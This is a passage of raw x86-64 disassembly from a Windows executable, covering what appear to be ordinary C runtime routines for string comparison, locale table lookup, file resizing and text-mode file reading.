   14000c187:	48 63 d8             	movslq %eax,%rbx
   14000c18a:	48 8b d3             	mov    %rbx,%rdx
   14000c18d:	48 03 d2             	add    %rdx,%rdx
   14000c190:	49 8b 14 d6          	mov    (%r14,%rdx,8),%rdx
   14000c194:	e8 03 01 00 00       	call   0x14000c29c
   14000c199:	85 c0                	test   %eax,%eax
   14000c19b:	74 13                	je     0x14000c1b0
   14000c19d:	79 05                	jns    0x14000c1a4
   14000c19f:	8d 73 ff             	lea    -0x1(%rbx),%esi
   14000c1a2:	eb 03                	jmp    0x14000c1a7
   14000c1a4:	8d 7b 01             	lea    0x1(%rbx),%edi
   14000c1a7:	3b fe                	cmp    %esi,%edi
   14000c1a9:	7e cb                	jle    0x14000c176
   14000c1ab:	83 c8 ff             	or     $0xffffffff,%eax
   14000c1ae:	eb 0b                	jmp    0x14000c1bb
   14000c1b0:	48 8b c3             	mov    %rbx,%rax
   14000c1b3:	48 03 c0             	add    %rax,%rax
   14000c1b6:	41 8b 44 c6 08       	mov    0x8(%r14,%rax,8),%eax
   14000c1bb:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000c1c0:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000c1c5:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000c1ca:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000c1cf:	48 83 c4 20          	add    $0x20,%rsp
   14000c1d3:	41 5e                	pop    %r14
   14000c1d5:	c3                   	ret
   14000c1d6:	cc                   	int3
   14000c1d7:	cc                   	int3
   14000c1d8:	48 83 ec 28          	sub    $0x28,%rsp
   14000c1dc:	48 85 c9             	test   %rcx,%rcx
   14000c1df:	74 22                	je     0x14000c203
   14000c1e1:	e8 66 ff ff ff       	call   0x14000c14c
   14000c1e6:	85 c0                	test   %eax,%eax
   14000c1e8:	78 19                	js     0x14000c203
   14000c1ea:	48 98                	cltq
   14000c1ec:	48 3d e4 00 00 00    	cmp    $0xe4,%rax
   14000c1f2:	73 0f                	jae    0x14000c203
   14000c1f4:	48 8d 0d 15 7b 00 00 	lea    0x7b15(%rip),%rcx        # 0x140013d10
   14000c1fb:	48 03 c0             	add    %rax,%rax
   14000c1fe:	8b 04 c1             	mov    (%rcx,%rax,8),%eax
   14000c201:	eb 02                	jmp    0x14000c205
   14000c203:	33 c0                	xor    %eax,%eax
   14000c205:	48 83 c4 28          	add    $0x28,%rsp
   14000c209:	c3                   	ret
   14000c20a:	cc                   	int3
   14000c20b:	cc                   	int3
   14000c20c:	4c 8b dc             	mov    %rsp,%r11
   14000c20f:	49 89 5b 08          	mov    %rbx,0x8(%r11)
   14000c213:	49 89 73 10          	mov    %rsi,0x10(%r11)
   14000c217:	57                   	push   %rdi
   14000c218:	48 83 ec 50          	sub    $0x50,%rsp
   14000c21c:	4c 8b 15 3d 0b 01 00 	mov    0x10b3d(%rip),%r10        # 0x14001cd60
   14000c223:	41 8b d9             	mov    %r9d,%ebx
   14000c226:	49 8b f8             	mov    %r8,%rdi
   14000c229:	4c 33 15 d0 cd 00 00 	xor    0xcdd0(%rip),%r10        # 0x140019000
   14000c230:	8b f2                	mov    %edx,%esi
   14000c232:	74 2a                	je     0x14000c25e
   14000c234:	33 c0                	xor    %eax,%eax
   14000c236:	49 89 43 e8          	mov    %rax,-0x18(%r11)
   14000c23a:	49 89 43 e0          	mov    %rax,-0x20(%r11)
   14000c23e:	49 89 43 d8          	mov    %rax,-0x28(%r11)
   14000c242:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   14000c249:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000c24d:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   14000c254:	00 
   14000c255:	49 89 43 c8          	mov    %rax,-0x38(%r11)
   14000c259:	41 ff d2             	call   *%r10
   14000c25c:	eb 2d                	jmp    0x14000c28b
   14000c25e:	e8 75 ff ff ff       	call   0x14000c1d8
   14000c263:	44 8b cb             	mov    %ebx,%r9d
   14000c266:	4c 8b c7             	mov    %rdi,%r8
   14000c269:	8b c8                	mov    %eax,%ecx
   14000c26b:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   14000c272:	8b d6                	mov    %esi,%edx
   14000c274:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000c278:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   14000c27f:	00 
   14000c280:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000c285:	ff 15 dd 4d 00 00    	call   *0x4ddd(%rip)        # 0x140011068
   14000c28b:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000c290:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   14000c295:	48 83 c4 50          	add    $0x50,%rsp
   14000c299:	5f                   	pop    %rdi
   14000c29a:	c3                   	ret
   14000c29b:	cc                   	int3
   14000c29c:	45 33 c9             	xor    %r9d,%r9d
   14000c29f:	4c 8b d2             	mov    %rdx,%r10
   14000c2a2:	4c 8b d9             	mov    %rcx,%r11
   14000c2a5:	4d 85 c0             	test   %r8,%r8
   14000c2a8:	74 43                	je     0x14000c2ed
   14000c2aa:	4c 2b da             	sub    %rdx,%r11
   14000c2ad:	43 0f b7 0c 13       	movzwl (%r11,%r10,1),%ecx
   14000c2b2:	8d 41 bf             	lea    -0x41(%rcx),%eax
   14000c2b5:	66 83 f8 19          	cmp    $0x19,%ax
   14000c2b9:	77 04                	ja     0x14000c2bf
   14000c2bb:	66 83 c1 20          	add    $0x20,%cx
   14000c2bf:	41 0f b7 12          	movzwl (%r10),%edx
   14000c2c3:	8d 42 bf             	lea    -0x41(%rdx),%eax
   14000c2c6:	66 83 f8 19          	cmp    $0x19,%ax
   14000c2ca:	77 04                	ja     0x14000c2d0
   14000c2cc:	66 83 c2 20          	add    $0x20,%dx
   14000c2d0:	49 83 c2 02          	add    $0x2,%r10
   14000c2d4:	49 ff c8             	dec    %r8
   14000c2d7:	74 0a                	je     0x14000c2e3
   14000c2d9:	66 85 c9             	test   %cx,%cx
   14000c2dc:	74 05                	je     0x14000c2e3
   14000c2de:	66 3b ca             	cmp    %dx,%cx
   14000c2e1:	74 ca                	je     0x14000c2ad
   14000c2e3:	0f b7 c2             	movzwl %dx,%eax
   14000c2e6:	44 0f b7 c9          	movzwl %cx,%r9d
   14000c2ea:	44 2b c8             	sub    %eax,%r9d
   14000c2ed:	41 8b c1             	mov    %r9d,%eax
   14000c2f0:	c3                   	ret
   14000c2f1:	cc                   	int3
   14000c2f2:	cc                   	int3
   14000c2f3:	cc                   	int3
   14000c2f4:	48 8b c4             	mov    %rsp,%rax
   14000c2f7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000c2fb:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000c2ff:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000c303:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000c307:	41 55                	push   %r13
   14000c309:	41 56                	push   %r14
   14000c30b:	41 57                	push   %r15
   14000c30d:	48 83 ec 20          	sub    $0x20,%rsp
   14000c311:	48 8b ea             	mov    %rdx,%rbp
   14000c314:	33 ff                	xor    %edi,%edi
   14000c316:	33 d2                	xor    %edx,%edx
   14000c318:	44 8d 47 01          	lea    0x1(%rdi),%r8d
   14000c31c:	8b f1                	mov    %ecx,%esi
   14000c31e:	e8 1d da ff ff       	call   0x140009d40
   14000c323:	4c 8b f8             	mov    %rax,%r15
   14000c326:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000c32a:	74 50                	je     0x14000c37c
   14000c32c:	44 8d 47 02          	lea    0x2(%rdi),%r8d
   14000c330:	33 d2                	xor    %edx,%edx
   14000c332:	8b ce                	mov    %esi,%ecx
   14000c334:	e8 07 da ff ff       	call   0x140009d40
   14000c339:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000c33d:	74 3d                	je     0x14000c37c
   14000c33f:	48 8b dd             	mov    %rbp,%rbx
   14000c342:	48 2b d8             	sub    %rax,%rbx
   14000c345:	48 85 db             	test   %rbx,%rbx
   14000c348:	0f 8e c1 00 00 00    	jle    0x14000c40f
   14000c34e:	ff 15 64 4e 00 00    	call   *0x4e64(%rip)        # 0x1400111b8
   14000c354:	41 bd 00 10 00 00    	mov    $0x1000,%r13d
   14000c35a:	8d 57 08             	lea    0x8(%rdi),%edx
   14000c35d:	48 8b c8             	mov    %rax,%rcx
   14000c360:	45 8b c5             	mov    %r13d,%r8d
   14000c363:	ff 15 47 4d 00 00    	call   *0x4d47(%rip)        # 0x1400110b0
   14000c369:	48 8b e8             	mov    %rax,%rbp
   14000c36c:	48 85 c0             	test   %rax,%rax
   14000c36f:	75 31                	jne    0x14000c3a2
   14000c371:	e8 02 82 ff ff       	call   0x140004578
   14000c376:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   14000c37c:	e8 f7 81 ff ff       	call   0x140004578
   14000c381:	8b 00                	mov    (%rax),%eax
   14000c383:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000c388:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000c38d:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000c392:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   14000c397:	48 83 c4 20          	add    $0x20,%rsp
   14000c39b:	41 5f                	pop    %r15
   14000c39d:	41 5e                	pop    %r14
   14000c39f:	41 5d                	pop    %r13
   14000c3a1:	c3                   	ret
   14000c3a2:	ba 00 80 00 00       	mov    $0x8000,%edx
   14000c3a7:	8b ce                	mov    %esi,%ecx
   14000c3a9:	e8 7e 09 00 00       	call   0x14000cd2c
   14000c3ae:	44 8b f0             	mov    %eax,%r14d
   14000c3b1:	44 8b c3             	mov    %ebx,%r8d
   14000c3b4:	49 3b dd             	cmp    %r13,%rbx
   14000c3b7:	48 8b d5             	mov    %rbp,%rdx
   14000c3ba:	45 0f 4d c5          	cmovge %r13d,%r8d
   14000c3be:	8b ce                	mov    %esi,%ecx
   14000c3c0:	e8 ff 9c ff ff       	call   0x1400060c4
   14000c3c5:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000c3c8:	74 0c                	je     0x14000c3d6
   14000c3ca:	48 98                	cltq
   14000c3cc:	48 2b d8             	sub    %rax,%rbx
   14000c3cf:	48 85 db             	test   %rbx,%rbx
   14000c3d2:	7e 1b                	jle    0x14000c3ef
   14000c3d4:	eb db                	jmp    0x14000c3b1
   14000c3d6:	e8 2d 81 ff ff       	call   0x140004508
   14000c3db:	83 38 05             	cmpl   $0x5,(%rax)
   14000c3de:	75 0b                	jne    0x14000c3eb
   14000c3e0:	e8 93 81 ff ff       	call   0x140004578
   14000c3e5:	c7 00 0d 00 00 00    	movl   $0xd,(%rax)
   14000c3eb:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   14000c3ef:	41 8b d6             	mov    %r14d,%edx
   14000c3f2:	8b ce                	mov    %esi,%ecx
   14000c3f4:	e8 33 09 00 00       	call   0x14000cd2c
   14000c3f9:	ff 15 b9 4d 00 00    	call   *0x4db9(%rip)        # 0x1400111b8
   14000c3ff:	4c 8b c5             	mov    %rbp,%r8
   14000c402:	48 8b c8             	mov    %rax,%rcx
   14000c405:	33 d2                	xor    %edx,%edx
   14000c407:	ff 15 bb 4c 00 00    	call   *0x4cbb(%rip)        # 0x1400110c8
   14000c40d:	eb 55                	jmp    0x14000c464
   14000c40f:	79 5d                	jns    0x14000c46e
   14000c411:	45 33 c0             	xor    %r8d,%r8d
   14000c414:	48 8b d5             	mov    %rbp,%rdx
   14000c417:	8b ce                	mov    %esi,%ecx
   14000c419:	e8 22 d9 ff ff       	call   0x140009d40
   14000c41e:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000c422:	0f 84 54 ff ff ff    	je     0x14000c37c
   14000c428:	8b ce                	mov    %esi,%ecx
   14000c42a:	e8 59 c1 ff ff       	call   0x140008588
   14000c42f:	48 8b c8             	mov    %rax,%rcx
   14000c432:	ff 15 28 4c 00 00    	call   *0x4c28(%rip)        # 0x140011060
   14000c438:	f7 d8                	neg    %eax
   14000c43a:	48 1b ff             	sbb    %rdi,%rdi
   14000c43d:	48 f7 df             	neg    %rdi
   14000c440:	48 ff cf             	dec    %rdi
   14000c443:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   14000c447:	75 25                	jne    0x14000c46e
   14000c449:	e8 2a 81 ff ff       	call   0x140004578
   14000c44e:	c7 00 0d 00 00 00    	movl   $0xd,(%rax)
   14000c454:	e8 af 80 ff ff       	call   0x140004508
   14000c459:	48 8b d8             	mov    %rax,%rbx
   14000c45c:	ff 15 2e 4c 00 00    	call   *0x4c2e(%rip)        # 0x140011090
   14000c462:	89 03                	mov    %eax,(%rbx)
   14000c464:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   14000c468:	0f 84 0e ff ff ff    	je     0x14000c37c
   14000c46e:	45 33 c0             	xor    %r8d,%r8d
   14000c471:	49 8b d7             	mov    %r15,%rdx
   14000c474:	8b ce                	mov    %esi,%ecx
   14000c476:	e8 c5 d8 ff ff       	call   0x140009d40
   14000c47b:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000c47f:	0f 84 f7 fe ff ff    	je     0x14000c37c
   14000c485:	33 c0                	xor    %eax,%eax
   14000c487:	e9 f7 fe ff ff       	jmp    0x14000c383
   14000c48c:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000c491:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000c495:	55                   	push   %rbp
   14000c496:	53                   	push   %rbx
   14000c497:	56                   	push   %rsi
   14000c498:	57                   	push   %rdi
   14000c499:	41 54                	push   %r12
   14000c49b:	41 55                	push   %r13
   14000c49d:	41 56                	push   %r14
   14000c49f:	41 57                	push   %r15
   14000c4a1:	48 8b ec             	mov    %rsp,%rbp
   14000c4a4:	48 83 ec 58          	sub    $0x58,%rsp
   14000c4a8:	41 8b d8             	mov    %r8d,%ebx
   14000c4ab:	33 ff                	xor    %edi,%edi
   14000c4ad:	4c 63 c1             	movslq %ecx,%r8
   14000c4b0:	4c 8b ca             	mov    %rdx,%r9
   14000c4b3:	c7 45 e0 fe ff ff ff 	movl   $0xfffffffe,-0x20(%rbp)
   14000c4ba:	89 7d e8             	mov    %edi,-0x18(%rbp)
   14000c4bd:	89 5d f0             	mov    %ebx,-0x10(%rbp)
   14000c4c0:	41 83 f8 fe          	cmp    $0xfffffffe,%r8d
   14000c4c4:	75 17                	jne    0x14000c4dd
   14000c4c6:	e8 3d 80 ff ff       	call   0x140004508
   14000c4cb:	89 38                	mov    %edi,(%rax)
   14000c4cd:	e8 a6 80 ff ff       	call   0x140004578
   14000c4d2:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000c4d8:	e9 0b 08 00 00       	jmp    0x14000cce8
   14000c4dd:	85 c9                	test   %ecx,%ecx
   14000c4df:	0f 88 ec 07 00 00    	js     0x14000ccd1
   14000c4e5:	44 3b 05 74 f7 00 00 	cmp    0xf774(%rip),%r8d        # 0x14001bc60
   14000c4ec:	0f 83 df 07 00 00    	jae    0x14000ccd1
   14000c4f2:	49 8b c0             	mov    %r8,%rax
   14000c4f5:	4d 8b e8             	mov    %r8,%r13
   14000c4f8:	4c 8d 15 01 3b ff ff 	lea    -0xc4ff(%rip),%r10        # 0x140000000
   14000c4ff:	83 e0 1f             	and    $0x1f,%eax
   14000c502:	49 c1 fd 05          	sar    $0x5,%r13
   14000c506:	4b 8b 8c ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rcx
   14000c50d:	00 
   14000c50e:	4c 6b f0 58          	imul   $0x58,%rax,%r14
   14000c512:	42 8a 44 31 08       	mov    0x8(%rcx,%r14,1),%al
   14000c517:	a8 01                	test   $0x1,%al
   14000c519:	0f 84 b2 07 00 00    	je     0x14000ccd1
   14000c51f:	81 fb ff ff ff 7f    	cmp    $0x7fffffff,%ebx
   14000c525:	76 17                	jbe    0x14000c53e
   14000c527:	e8 dc 7f ff ff       	call   0x140004508
   14000c52c:	89 38                	mov    %edi,(%rax)
   14000c52e:	e8 45 80 ff ff       	call   0x140004578
   14000c533:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000c539:	e9 a5 07 00 00       	jmp    0x14000cce3
   14000c53e:	8b f7                	mov    %edi,%esi
   14000c540:	85 db                	test   %ebx,%ebx
   14000c542:	0f 84 85 07 00 00    	je     0x14000cccd
   14000c548:	a8 02                	test   $0x2,%al
   14000c54a:	0f 85 7d 07 00 00    	jne    0x14000cccd
   14000c550:	48 85 d2             	test   %rdx,%rdx
   14000c553:	74 d2                	je     0x14000c527
   14000c555:	42 8a 54 31 38       	mov    0x38(%rcx,%r14,1),%dl
   14000c55a:	41 bb 04 00 00 00    	mov    $0x4,%r11d
   14000c560:	02 d2                	add    %dl,%dl
   14000c562:	d0 fa                	sar    $1,%dl
   14000c564:	0f be ca             	movsbl %dl,%ecx
   14000c567:	88 55 60             	mov    %dl,0x60(%rbp)
   14000c56a:	ff c9                	dec    %ecx
   14000c56c:	74 14                	je     0x14000c582
   14000c56e:	ff c9                	dec    %ecx
   14000c570:	75 0b                	jne    0x14000c57d
   14000c572:	8b c3                	mov    %ebx,%eax
   14000c574:	f7 d0                	not    %eax
   14000c576:	a8 01                	test   $0x1,%al
   14000c578:	74 ad                	je     0x14000c527
   14000c57a:	83 e3 fe             	and    $0xfffffffe,%ebx
   14000c57d:	4d 8b f9             	mov    %r9,%r15
   14000c580:	eb 64                	jmp    0x14000c5e6
   14000c582:	8b c3                	mov    %ebx,%eax
   14000c584:	f7 d0                	not    %eax
   14000c586:	a8 01                	test   $0x1,%al
   14000c588:	74 9d                	je     0x14000c527
   14000c58a:	d1 eb                	shr    $1,%ebx
   14000c58c:	41 3b db             	cmp    %r11d,%ebx
   14000c58f:	41 0f 42 db          	cmovb  %r11d,%ebx
   14000c593:	8b cb                	mov    %ebx,%ecx
   14000c595:	e8 9a ad ff ff       	call   0x140007334
   14000c59a:	4c 8b f8             	mov    %rax,%r15
   14000c59d:	48 85 c0             	test   %rax,%rax
   14000c5a0:	75 1b                	jne    0x14000c5bd
   14000c5a2:	e8 d1 7f ff ff       	call   0x140004578
   14000c5a7:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   14000c5ad:	e8 56 7f ff ff       	call   0x140004508
   14000c5b2:	c7 00 08 00 00 00    	movl   $0x8,(%rax)
   14000c5b8:	e9 2b 07 00 00       	jmp    0x14000cce8
   14000c5bd:	8b 4d 48             	mov    0x48(%rbp),%ecx
   14000c5c0:	33 d2                	xor    %edx,%edx
   14000c5c2:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   14000c5c6:	e8 75 d7 ff ff       	call   0x140009d40
   14000c5cb:	8a 55 60             	mov    0x60(%rbp),%dl
   14000c5ce:	44 8b 45 48          	mov    0x48(%rbp),%r8d
   14000c5d2:	4c 8d 15 27 3a ff ff 	lea    -0xc5d9(%rip),%r10        # 0x140000000
   14000c5d9:	4b 8b 8c ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rcx
   14000c5e0:	00 
   14000c5e1:	4a 89 44 31 40       	mov    %rax,0x40(%rcx,%r14,1)
   14000c5e6:	4b 8b 84 ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rax
   14000c5ed:	00 
   14000c5ee:	4d 8b e7             	mov    %r15,%r12
   14000c5f1:	41 b9 0a 00 00 00    	mov    $0xa,%r9d
   14000c5f7:	42 f6 44 30 08 48    	testb  $0x48,0x8(%rax,%r14,1)
   14000c5fd:	0f 84 a0 00 00 00    	je     0x14000c6a3
   14000c603:	42 8a 4c 30 09       	mov    0x9(%rax,%r14,1),%cl
   14000c608:	41 3a c9             	cmp    %r9b,%cl
   14000c60b:	0f 84 92 00 00 00    	je     0x14000c6a3
   14000c611:	85 db                	test   %ebx,%ebx
   14000c613:	0f 84 8a 00 00 00    	je     0x14000c6a3
   14000c619:	41 88 0f             	mov    %cl,(%r15)
   14000c61c:	4b 8b 84 ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rax
   14000c623:	00 
   14000c624:	41 83 cb ff          	or     $0xffffffff,%r11d
   14000c628:	41 03 db             	add    %r11d,%ebx
   14000c62b:	4d 8d 67 01          	lea    0x1(%r15),%r12
   14000c62f:	41 8d 71 f7          	lea    -0x9(%r9),%esi
   14000c633:	46 88 4c 30 09       	mov    %r9b,0x9(%rax,%r14,1)
   14000c638:	84 d2                	test   %dl,%dl
   14000c63a:	74 67                	je     0x14000c6a3
   14000c63c:	4b 8b 84 ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rax
   14000c643:	00 
   14000c644:	42 8a 4c 30 39       	mov    0x39(%rax,%r14,1),%cl
   14000c649:	41 3a c9             	cmp    %r9b,%cl
   14000c64c:	74 55                	je     0x14000c6a3
   14000c64e:	85 db                	test   %ebx,%ebx
   14000c650:	74 51                	je     0x14000c6a3
   14000c652:	41 88 0c 24          	mov    %cl,(%r12)
   14000c656:	4b 8b 84 ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rax
   14000c65d:	00 
   14000c65e:	41 03 db             	add    %r11d,%ebx
   14000c661:	49 ff c4             	inc    %r12
   14000c664:	41 8d 71 f8          	lea    -0x8(%r9),%esi
   14000c668:	46 88 4c 30 39       	mov    %r9b,0x39(%rax,%r14,1)
   14000c66d:	80 fa 01             	cmp    $0x1,%dl
   14000c670:	75 31                	jne    0x14000c6a3
   14000c672:	4b 8b 84 ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rax
   14000c679:	00 
   14000c67a:	42 8a 4c 30 3a       	mov    0x3a(%rax,%r14,1),%cl
   14000c67f:	41 3a c9             	cmp    %r9b,%cl
   14000c682:	74 1f                	je     0x14000c6a3
   14000c684:	85 db                	test   %ebx,%ebx
   14000c686:	74 1b                	je     0x14000c6a3
   14000c688:	41 88 0c 24          	mov    %cl,(%r12)
   14000c68c:	4b 8b 84 ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rax
   14000c693:	00 
   14000c694:	49 ff c4             	inc    %r12
   14000c697:	41 8d 71 f9          	lea    -0x7(%r9),%esi
   14000c69b:	41 03 db             	add    %r11d,%ebx
   14000c69e:	46 88 4c 30 3a       	mov    %r9b,0x3a(%rax,%r14,1)
   14000c6a3:	41 8b c8             	mov    %r8d,%ecx
   14000c6a6:	e8 5d c6 ff ff       	call   0x140008d08
   14000c6ab:	85 c0                	test   %eax,%eax
   14000c6ad:	0f 84 80 00 00 00    	je     0x14000c733
   14000c6b3:	48 8d 0d 46 39 ff ff 	lea    -0xc6ba(%rip),%rcx        # 0x140000000
   14000c6ba:	4a 8b 8c e9 10 af 01 	mov    0x1af10(%rcx,%r13,8),%rcx
   14000c6c1:	00 
   14000c6c2:	42 f6 44 31 08 80    	testb  $0x80,0x8(%rcx,%r14,1)
   14000c6c8:	74 69                	je     0x14000c733
   14000c6ca:	4a 8b 0c 31          	mov    (%rcx,%r14,1),%rcx
   14000c6ce:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
   14000c6d2:	ff 15 b8 4a 00 00    	call   *0x4ab8(%rip)        # 0x140011190
   14000c6d8:	89 45 e8             	mov    %eax,-0x18(%rbp)
   14000c6db:	85 c0                	test   %eax,%eax
   14000c6dd:	74 54                	je     0x14000c733
   14000c6df:	80 7d 60 02          	cmpb   $0x2,0x60(%rbp)
   14000c6e3:	75 4e                	jne    0x14000c733
   14000c6e5:	48 8d 05 14 39 ff ff 	lea    -0xc6ec(%rip),%rax        # 0x140000000
   14000c6ec:	d1 eb                	shr    $1,%ebx
   14000c6ee:	4c 8d 4d dc          	lea    -0x24(%rbp),%r9
   14000c6f2:	4a 8b 8c e8 10 af 01 	mov    0x1af10(%rax,%r13,8),%rcx
   14000c6f9:	00 
   14000c6fa:	49 8b d4             	mov    %r12,%rdx
   14000c6fd:	44 8b c3             	mov    %ebx,%r8d
   14000c700:	4a 8b 0c 31          	mov    (%rcx,%r14,1),%rcx
   14000c704:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000c709:	ff 15 51 4b 00 00    	call   *0x4b51(%rip)        # 0x140011260
   14000c70f:	85 c0                	test   %eax,%eax
   14000c711:	75 15                	jne    0x14000c728
   14000c713:	ff 15 77 49 00 00    	call   *0x4977(%rip)        # 0x140011090
   14000c719:	8b c8                	mov    %eax,%ecx
   14000c71b:	e8 08 7e ff ff       	call   0x140004528
   14000c720:	83 cb ff             	or     $0xffffffff,%ebx
   14000c723:	e9 aa 03 00 00       	jmp    0x14000cad2
   14000c728:	8b 45 dc             	mov    -0x24(%rbp),%eax
   14000c72b:	8d 14 00             	lea    (%rax,%rax,1),%edx
   14000c72e:	89 55 dc             	mov    %edx,-0x24(%rbp)
   14000c731:	eb 47                	jmp    0x14000c77a
   14000c733:	48 8d 0d c6 38 ff ff 	lea    -0xc73a(%rip),%rcx        # 0x140000000
   14000c73a:	4c 8d 4d dc          	lea    -0x24(%rbp),%r9
   14000c73e:	44 8b c3             	mov    %ebx,%r8d
   14000c741:	4a 8b 8c e9 10 af 01 	mov    0x1af10(%rcx,%r13,8),%rcx
   14000c748:	00 
   14000c749:	49 8b d4             	mov    %r12,%rdx
   14000c74c:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000c751:	4a 8b 0c 31          	mov    (%rcx,%r14,1),%rcx
   14000c755:	ff 15 fd 48 00 00    	call   *0x48fd(%rip)        # 0x140011058
   14000c75b:	85 c0                	test   %eax,%eax
   14000c75d:	0f 84 34 05 00 00    	je     0x14000cc97
   14000c763:	48 63 55 dc          	movslq -0x24(%rbp),%rdx
   14000c767:	85 d2                	test   %edx,%edx
   14000c769:	0f 88 28 05 00 00    	js     0x14000cc97
   14000c76f:	8b c3                	mov    %ebx,%eax
   14000c771:	48 3b d0             	cmp    %rax,%rdx
   14000c774:	0f 87 1d 05 00 00    	ja     0x14000cc97
   14000c77a:	4c 8d 15 7f 38 ff ff 	lea    -0xc781(%rip),%r10        # 0x140000000
   14000c781:	03 f2                	add    %edx,%esi
   14000c783:	4b 8b 8c ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rcx
   14000c78a:	00 
   14000c78b:	42 8a 44 31 08       	mov    0x8(%rcx,%r14,1),%al
   14000c790:	84 c0                	test   %al,%al
   14000c792:	0f 89 37 03 00 00    	jns    0x14000cacf
   14000c798:	80 7d 60 02          	cmpb   $0x2,0x60(%rbp)
   14000c79c:	0f 84 a5 02 00 00    	je     0x14000ca47
   14000c7a2:	85 d2                	test   %edx,%edx
   14000c7a4:	ba 0a 00 00 00       	mov    $0xa,%edx
   14000c7a9:	74 09                	je     0x14000c7b4
   14000c7ab:	41 38 17             	cmp    %dl,(%r15)
   14000c7ae:	75 04                	jne    0x14000c7b4
   14000c7b0:	0c 04                	or     $0x4,%al
   14000c7b2:	eb 02                	jmp    0x14000c7b6
   14000c7b4:	24 fb                	and    $0xfb,%al
   14000c7b6:	42 88 44 31 08       	mov    %al,0x8(%rcx,%r14,1)
   14000c7bb:	48 63 c6             	movslq %esi,%rax
   14000c7be:	49 8b df             	mov    %r15,%rbx
   14000c7c1:	49 03 c7             	add    %r15,%rax
   14000c7c4:	4d 8b e7             	mov    %r15,%r12
   14000c7c7:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000c7cb:	4c 3b f8             	cmp    %rax,%r15
   14000c7ce:	0f 83 33 01 00 00    	jae    0x14000c907
   14000c7d4:	be 0d 00 00 00       	mov    $0xd,%esi
   14000c7d9:	41 8a 04 24          	mov    (%r12),%al
   14000c7dd:	3c 1a                	cmp    $0x1a,%al
   14000c7df:	0f 84 ff 00 00 00    	je     0x14000c8e4
   14000c7e5:	40 3a c6             	cmp    %sil,%al
   14000c7e8:	74 0d                	je     0x14000c7f7
   14000c7ea:	88 03                	mov    %al,(%rbx)
   14000c7ec:	48 ff c3             	inc    %rbx
   14000c7ef:	49 ff c4             	inc    %r12
   14000c7f2:	e9 e1 00 00 00       	jmp    0x14000c8d8
   14000c7f7:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   14000c7fb:	48 ff c8             	dec    %rax
   14000c7fe:	4c 3b e0             	cmp    %rax,%r12
   14000c801:	73 1a                	jae    0x14000c81d
   14000c803:	49 8d 44 24 01       	lea    0x1(%r12),%rax
   14000c808:	38 10                	cmp    %dl,(%rax)
   14000c80a:	75 09                	jne    0x14000c815
   14000c80c:	49 83 c4 02          	add    $0x2,%r12
   14000c810:	e9 88 00 00 00       	jmp    0x14000c89d
   14000c815:	4c 8b e0             	mov    %rax,%r12
   14000c818:	e9 b5 00 00 00       	jmp    0x14000c8d2
   14000c81d:	4b 8b 8c ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rcx
   14000c824:	00 
   14000c825:	4c 8d 4d dc          	lea    -0x24(%rbp),%r9
   14000c829:	48 8d 55 58          	lea    0x58(%rbp),%rdx
   14000c82d:	4a 8b 0c 31          	mov    (%rcx,%r14,1),%rcx
   14000c831:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000c837:	49 ff c4             	inc    %r12
   14000c83a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000c83f:	ff 15 13 48 00 00    	call   *0x4813(%rip)        # 0x140011058
   14000c845:	85 c0                	test   %eax,%eax
   14000c847:	75 0a                	jne    0x14000c853
   14000c849:	ff 15 41 48 00 00    	call   *0x4841(%rip)        # 0x140011090
   14000c84f:	85 c0                	test   %eax,%eax
   14000c851:	75 73                	jne    0x14000c8c6
   14000c853:	39 7d dc             	cmp    %edi,-0x24(%rbp)
   14000c856:	74 6e                	je     0x14000c8c6
